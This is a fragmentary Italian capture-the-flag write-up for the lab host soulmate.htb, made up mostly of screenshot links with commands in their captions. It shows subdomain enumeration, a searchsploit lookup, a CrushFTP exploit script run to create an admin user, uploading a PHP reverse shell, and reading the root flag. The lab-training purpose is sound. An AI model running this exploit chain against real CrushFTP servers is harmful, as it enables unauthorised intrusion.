...
![gobuster vhost --append-domain -u http://soulmate.htb -w /usr/share/wordlist/Seclist-master/Discovery/DNS/subdomains-top1million-5000.txt](./images/4-sottodominio.png)
...
![http://ftp.soulmate.htb](./images/5-sito_ftp.png)
...
![searchsploit crushftp](./images/6-searchsploit.png)
...
![python3 52295.py --port 80 --target ftp.soulmate.htb --exploit --new-user <username> --password <password>](./images/7-exploit.png)
...
![login con utente creato](./images/8.0-crushftp1.png)
![file di utente ben](./images/8.1-crushftp2.png)
![file di utente creato](./images/8.2crushftp3.png)

Ora possiamo creare una reverse shell in php e caricarla nella cartella webProd

![https://www.revshells.com/](./images/9.0-rev_shell.png)
![upload file](./images/9.1-upload_shell.png)
...
![os:cmd("ls /root/root.txt")](./images/16-root_flag.png)